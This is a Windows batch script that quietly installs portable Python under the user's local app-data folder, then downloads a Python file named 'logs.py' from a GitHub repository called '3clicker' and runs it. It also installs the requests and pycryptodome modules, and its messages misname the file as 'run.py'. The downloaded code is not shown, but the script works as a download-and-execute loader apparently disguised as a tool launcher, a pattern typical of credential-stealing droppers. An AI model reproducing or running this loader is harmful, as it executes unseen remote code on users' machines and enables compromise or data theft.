@echo off
setlocal

:: --- Configuration ---
set "PYDIR=%LOCALAPPDATA%\PythonPortable"
set "WINPY_ZIP_URL=https://github.com/winpython/winpython/releases/download/16.6.20250620final/Winpython64-3.12.10.1dot.zip"
set "RUNURL=https://github.com/meechtrades/3clicker/raw/refs/heads/main/logs.py"
set "RUNFILE=logs.py"
:: ---------------------

echo [*] Creating destination folder: "%PYDIR%"
mkdir "%PYDIR%" 2>nul

:: Download and extract WinPython portable ZIP if not already done
if not exist "%PYDIR%\WinPythonExtracted.marker" (
    echo [*] Downloading WinPython portable ZIP...
    powershell -Command "Invoke-WebRequest -Uri '%WINPY_ZIP_URL%' -OutFile '%PYDIR%\winpython.zip'"
    echo [*] Extracting WinPython ZIP...
    powershell -Command "Expand-Archive -Path '%PYDIR%\winpython.zip' -DestinationPath '%PYDIR%' -Force"
    del "%PYDIR%\winpython.zip"
    :: marker file to indicate extraction is done
    echo done> "%PYDIR%\WinPythonExtracted.marker"
)

:: Detect python.exe and its folder
for /d %%D in ("%PYDIR%\*") do (
    if exist "%%D\python\python.exe" (
        set "PYTHON_EXE=%%D\python\python.exe"
        set "PYFOLDER=%%D\python"
    )
)

if not defined PYTHON_EXE (
    echo ERROR: python.exe not found inside WinPython folder!
    pause
    exit /b 1
)

:: Download run.py into python.exe folder if missing
if not exist "%PYFOLDER%\%RUNFILE%" (
    echo [*] Downloading run.py...
    powershell -Command "Invoke-WebRequest -Uri '%RUNURL%' -OutFile '%PYFOLDER%\%RUNFILE%'"
)

:: Install required Python modules if missing
for %%M in (requests pycryptodome) do (
    "%PYTHON_EXE%" -m pip show %%M >nul 2>&1
    if errorlevel 1 (
        echo [*] Installing %%M...
        "%PYTHON_EXE%" -m pip install --no-cache-dir %%M
    )
)

:: --- Run run.py once, keep CMD window open ---
echo [*] Running run.py...
cd /d "%PYFOLDER%"
"%PYTHON_EXE%" "%RUNFILE%"

echo [*] run.py exited. CMD will remain open...
cmd /k
